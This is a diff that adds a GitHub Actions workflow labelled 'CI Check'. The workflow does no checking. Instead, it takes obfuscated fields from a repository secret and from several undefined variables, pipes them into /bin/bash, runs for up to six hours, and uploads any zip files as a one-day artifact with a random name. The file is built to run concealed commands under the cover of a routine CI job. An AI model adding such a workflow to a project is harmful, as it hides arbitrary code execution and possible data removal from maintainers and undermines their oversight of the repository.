@@ -1,0 +1,38 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          skko4832: ${{ secrets.skko4832 }}
+        run: |
+          printf '%s' "$skko4832" | jq -r .qhh404 | /bin/bash
+          printf '%s' "$dlqd401" | jq -r .lljk18447 | /bin/bash
+          printf '%s' "$e64" | jq -r .bnvdg4 | /bin/bash
+          echo $t8 | jq -r .scew36150 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Fo4BDI3G
+          path: "*.zip"
+          retention-days: 1
